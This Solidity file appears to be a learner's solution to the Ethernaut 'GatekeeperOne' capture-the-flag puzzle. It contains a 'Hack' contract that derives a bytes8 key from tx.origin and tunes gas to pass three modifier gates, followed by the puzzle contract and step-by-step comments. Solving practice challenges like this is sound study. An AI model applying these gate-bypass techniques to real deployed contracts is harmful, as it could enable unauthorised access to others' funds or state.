// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goal is to set entrant to our address
// Gatekeepercontract: we need to pass 3 gatekeepers


interface IGateKeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}


contract Hack {
    function enter(address _target, uint256 gas) external {

        // Use interface from GateKeeperOne contract
        IGateKeeperOne target = IGateKeeperOne(_target);
        // k = uint64(key)
        // 1. uint32(k) = uint16(k)
        // 2. uint32(k) != k
        // 3. uint32(k) == uint16(uint160(tx.origin))

        // 3. uint32(k) == uint16(uint160(tx.origin))
        // 1. uint32(k) = uint16(k)
        uint16 k16 = uint16(uint160(tx.origin));
        // 2. uint32(k) != k
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);


        require(gas < 8191, "gas > 8191");
        require(target.enter{gas: 8191 * 10 + gas}(key), "failed");



    }
    
    // gasleft() is a Solidity function that returns the amount of gas remaining for the current transaction or call. 
    // gasleft() is often used in contracts to enforce gas-related rules. For example, 
    // it can be used in a modifier to ensure that a specific amount or multiple of gas remains before proceeding with the rest of the function.
    // This means the gas remaining at that point in the transaction must be an exact multiple of 8191
    // So experiment with the gas limit for the transaction until gasleft() happens to be a multiple of 8191 at the 
    // exact point when gateTwo is invoked
    function checkGas() external view returns (uint256) {
        uint256 remainingGas = gasleft();
        return remainingGas;
    }

    // If we get remainingGas = 2978751
    // Then 2978751 / 8191 = 363.66
    // Take 364 * 8191 = 2981524
    // So we add 2981524 - 2978751 = 2773

    // Move getInfo outside the enter function
    function getInfo() public view returns (uint160, uint16, uint64, uint64, uint64, bytes8) {
        // Step 1: tx.origin = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
        // Step 2: test1 = uint160 integer equivalent of tx.origin: 520786028573371803640530888255888666801131675076 
        uint160 test1 = uint160(tx.origin);
       
        // Step 3: This takes the last 16 bits of tx.origin, or the the last 4 hexadecimal characters
        // Last 4 hexadecimal characters are DDC4
        // Converting 0xDDC4 to decimal gives 56772
        uint16 k16 = uint16(uint160(tx.origin));
        
        // Step 4: 
        // The bit positions are numbered starting from the right at position 0 and increase by one for each bit moving left.
        // So 1 << 63 = shifting the 1 bit 63 places to the left, which places it in the 64th bit position (since counting starts from 0).
        // So 1 << 63 = 1 followed by 63 zeros, representing the highest bit set in a 64-bit unsigned integer.
        // This equals 0x8000000000000000 in hexadecimal.
        // Which equals 9223372036854775808  in decimal.
        uint64 test2 = uint64(1 << 63);

        // uint16 k16 was already calculated above: 56772
        // If k16 is a uint16 with a value of 56772, then casting it to a uint64 with uint64(k16) will still result in 56772.
        // We only padd zeros to the left: 0x000000000000DDC4 also becomes 56772
        uint64 test3 =  uint64(k16);

        // We already know from above that  uint64(1 << 63) = 0x8000000000000000 in hexadecimal
        // So we get 0x8000000000000000 + 0xDDC4 = 0x800000000000DDC4
        // In hexadecimal addition, each digit is added separately.
        // The 0x8000000000000000 part occupies only the high 64th bit, with all lower bits as 0.
        // So, adding 0x8000000000000000 and 0x000000000000DDC4 results in
        // Which is 9223372036854832580 in decimal
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        // The value 0x800000000000DDC4 becomes 0x800000000000DDC4 in bytes8 format
        // It fits as: 1 byte = 8 bits, and k64 has 64 bits (or 8 bytes)
        bytes8 key = bytes8(k64);

        return (test1, k16, test2, test3, k64, key);
    }




    function getTXOrigin() public view returns(address) {
        return tx.origin;
    }
}

contract GatekeeperOne {
    address public entrant;

    // Gate 1: the caller of the contract function (msg.sender) cannot be the 
    // original external account that initiated the transaction (tx.origin).
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // Gate 2: This requires that the remaining gas when entering the modifier is a multiple of 8191.
    // Try calling enter function with an exact gas limit (in increments of 8191) until it succeeds.
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    function getTXOrigin() public view returns(address) {
        return tx.origin;
    }

    // Gate 3: 3 requirements (see below)
     
    modifier gateThree(bytes8 _gateKey) {
        // 1st: require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)))
        // This means: The first 32 bits of _gateKey (after casting to uint64) must be equal to the first 16 bits of _gateKey.
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");

        // 2nd: uint32(uint64(_gateKey)) != uint64(_gateKey)
        // This means: The first 32 bits of _gateKey (after casting to uint64) must be NOT equal to the FULL bits of _gateKey.
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");

        // 3rd: uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))

        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}